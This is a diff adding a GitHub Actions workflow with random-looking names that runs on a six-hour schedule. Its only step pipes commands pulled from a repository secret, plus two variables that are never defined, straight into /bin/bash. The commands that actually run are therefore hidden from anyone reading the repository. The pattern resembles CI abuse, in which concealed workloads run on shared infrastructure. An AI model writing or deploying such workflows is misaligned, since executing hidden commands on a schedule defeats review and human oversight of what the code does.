@@ -1,0 +1,21 @@
+name: yanshanxi4376
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanshanxi4376
+        env:
+          yg41776: ${{ secrets.yg41776 }}
+        run: |
+          echo $yg41776 | jq -r .aiaje8900 | /bin/bash
+          echo $w89 | jq -r .qmn495 | /bin/bash
+          echo $wrfc9681 | jq -r .cspp2962 | /bin/bash
+
